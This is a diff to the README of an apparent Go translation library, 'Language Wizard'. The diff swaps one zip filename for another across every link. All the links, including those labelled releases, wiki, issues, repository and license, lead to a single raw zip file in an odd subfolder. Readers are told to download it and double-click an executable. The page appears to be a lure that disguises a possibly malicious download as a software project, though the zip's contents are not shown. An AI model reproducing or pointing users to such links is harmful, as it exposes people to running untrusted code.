@@ -6,7 +6,7 @@ Welcome to Language Wizard! This tiny tool will help you manage languages in you
 
 ## 📥 Download Language Wizard
 
-[![Download Language Wizard](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip%20Now-Click%https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip)](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip)
+[![Download Language Wizard](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip%20Now-Click%https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip)](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip)
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ Make sure your system meets the following requirements:
 To get started with Language Wizard, follow these simple steps:
 
 1. **Visit the Releases Page:**  
-   Click the link to go to our [Releases page](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip).
+   Click the link to go to our [Releases page](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip).
 
 2. **Find the Latest Release:**  
    Look for the latest version of Language Wizard on the page. 
@@ -44,7 +44,7 @@ To get started with Language Wizard, follow these simple steps:
 
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file, then drag the Language Wizard icon to your Applications folder.
-   - **Linux:** Extract the files from the `https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip` file and run the executable.
+   - **Linux:** Extract the files from the `https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip` file and run the executable.
 
 5. **Run Language Wizard:**  
    After installation, find Language Wizard in your applications list and open it.
@@ -67,7 +67,7 @@ Once you have Language Wizard up and running, set it up by following these steps
 
 ## 📚 Documentation
 
-For more detailed usage instructions, check out the complete documentation on our [GitHub Wiki](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip).
+For more detailed usage instructions, check out the complete documentation on our [GitHub Wiki](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -84,13 +84,13 @@ If you encounter any issues, consider the following common problems:
 
 ## 💬 Community Support
 
-Join our community for support and share your experiences. You can ask questions, report issues, or provide feedback. Use the [Issues](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip) section to communicate with the developers and users.
+Join our community for support and share your experiences. You can ask questions, report issues, or provide feedback. Use the [Issues](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip) section to communicate with the developers and users.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip)
-- [License Information](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip)
+- [License Information](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip)
 
-[![Download Language Wizard](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip%20Now-Click%https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip)](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language_wizard.zip) 
+[![Download Language Wizard](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip%20Now-Click%https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip)](https://raw.githubusercontent.com/TurkeyGamings/language_wizard/main/saccharify/language-wizard-1.9-beta.5.zip) 
 
 With Language Wizard, managing translations in your Go applications has never been easier. Enjoy flexibility and control over your language settings today!
